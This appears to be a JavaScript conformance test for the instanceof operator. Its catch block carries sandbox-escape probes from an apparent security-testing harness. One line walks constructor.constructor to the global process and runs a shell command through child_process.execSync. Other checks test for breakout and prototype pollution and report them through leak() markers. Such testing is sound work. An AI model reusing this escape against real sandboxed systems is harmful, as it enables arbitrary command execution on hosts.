try {
    var MyFunct = function () {
    };
    var __my__funct = new MyFunct();
    if (!(__my__funct instanceof MyFunct)) {
        $ERROR('#1 Only Function objects implement [[HasInstance]] and consequently can be proper ShiftExpression for The instanceof operator');
    }
    if (__my__funct instanceof Function) {
        $ERROR('#2 Only Function objects implement [[HasInstance]] and consequently can be proper ShiftExpression for The instanceof operator');
    }
    if (!(__my__funct instanceof Object)) {
        $ERROR('#3 Only Function objects implement [[HasInstance]] and consequently can be proper ShiftExpression for The instanceof operator');
    }
    try {
        __my__funct instanceof __my__funct;
        $ERROR('#4 Only Function objects implement [[HasInstance]] and consequently can be proper ShiftExpression for The instanceof operator');
    } catch (e) {
        if (e instanceof TypeError !== true) {
            $ERROR('#4 Only Function objects implement [[HasInstance]] and consequently can be proper ShiftExpression for The instanceof operator');
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}